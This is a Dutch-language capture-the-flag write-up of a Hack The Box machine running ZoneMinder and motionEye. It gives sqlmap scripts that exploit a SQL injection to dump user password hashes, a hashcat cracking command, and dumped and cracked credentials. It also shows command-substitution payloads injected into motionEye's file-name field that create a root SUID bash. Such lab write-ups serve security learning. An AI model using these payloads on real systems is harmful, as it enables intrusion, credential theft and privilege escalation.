# CCTV

De hoofdpagina toont een tool voor CCTV monitoring. Er is een duidelijke _staff
login_ knop aanwezig. Hiermee komen we op een pagina uit voor iets dat
zoneminder heet.

Met de default credentials hiervoor kunnen we inloggen. `admin:admin`. Na wat
rondzoeken op het internet kom ik
[CVE-2024-51482](https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-qm8h-3xvf-m7j3)
tegen.

De zoneminder versie die we hier gebruiken is vatbaar voor deze exploit.

# squeel

Met `sqlmap` kunnen we de nodige informatie achterhalen. Hiervoor zijn de
volgende scripts gebruikt:

```bash
#!/bin/bash

export COOKIE='ZMSESSID=...'
export DB_NAME=zm

# Eerst halen we all databases op
function get_dbs {
    sqlmap \
        -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' \
        --cookie $COOKIE \
        --dbms=mysql \
        --technique=T \
        --batch \
        --dbs
}

# Dan de tabellen van de database
function get_tables {
    sqlmap \
        -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' \
        --cookie $COOKIE \
        --dbms=mysql \
        --technique=T \
        --tables \
        -D $DB_NAME
}

# En nu de kolommen
function get_columns {
    sqlmap \
        -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' \
        --cookie $COOKIE \
        --dbms=mysql \
        --technique=T \
        --columns \
        -D $DB_NAME \
        -T Users
}

# Als laatste dump de relevante users tabel informatie
function dump_users {
    sqlmap \
        -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' \
        --cookie $COOKIE \
        --dbms=mysql \
        --technique=T \
        -D $DB_NAME \
        -T Users \
        -C Username,Password \
        --dump
}

dump_users
```

## Squeel users

```
superadmin:$2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm
mark:$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.
admin:$2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m
```

En met hashcat kunnen we de data achterhalen

```bash
hashcat username_hashes.txt \
    /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt \
    --username \
    -m 3200
```

Hiermee vinden we de volgende users:

```
mark:opensesame
admin:admin
```

> Met de `mark` user hebben we ook SSH toegang

# Foothold

In `/etc/passwd` komen we de volgende users tegen die een shell mogen openen:

```
root:x:0:0:root:/root:/bin/bash
mark:x:1000:1000:mark:/home/mark:/bin/bash
sa_mark:x:1001:1001::/home/sa_mark:/bin/sh
```

## Open poorten

Via `ss -tunlp` komen we een stapel poorten en tools tegen. Het gaat dan om:

- `:8888` Hier draait mediamtx op maar nog niet echt kunnen uitvogelen hoe en wat
- `:7999` Ook mediamtx met de response `Motion 4.7.1 Running [1] Camera`
  - In `motioneye.conf` die ik op de server vond is dit de `motion_control_port`
- `:9081` Een stream van een CCTV camera. Hier is niks echt op te zien
- `:8765` Een inlog pagina voor iets dat "motionEye" heeft
- `:8554` - ~Gooit gelijk een 400 zonder duidelijke response wat het is.~
  - Dit is de zelfde video stream als `:9081` maar dan met de url `rtsp://localhost:8554/cam01`

## Motioneye

In `/etc/motion/motion.conf` staat een comment met

```
# @admin_username admin
# @normal_username user
# @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0
```

Eerst dacht ik dat dit om een MD5 hash ging of iets dergelijks maar ik kan in de
motioneye UI inloggen met `admin:989c5a8ee87a0e9521ec81a79187d162109282f0`. Dit
is dus echt het volledige wachtwoord.

### CVE-2025-60787

Er is een CVE voor motion eye, [zie ook de
advisory](https://github.com/advisories/GHSA-j945-qm58-4gjx). Waarmee we shell
execution kunnen krijgen. Dit is wel een goede om uit te zoeken als wie we dan
een user krijgen.

# Privesc

Dit is een _first_, ik heb eerder de root flag te pakken dan de user flag. Met
`CVE-2025-60787` was het mogelijk om shell executie te doen, ik kon zo snel geen
interactieve shell krijgen dus wat ik heb gedaan is het volgende:

- In motioneye de `image file name` gezet op: `$(cp /bin/bash /home/mark/bash).naam`
  - Hiermee had ik een kopie van bash in mijn home folder die door root gemaakt
    is.
- Daarna het volgende bestandsnaam ingesteld `$(chmod +s /home/mark/bash)`
  - En nu heb ik bash met een suid en kan ik `/home/mark/bash -p` doen vanuit de
    SSH connectie die ik al had om root te worden.
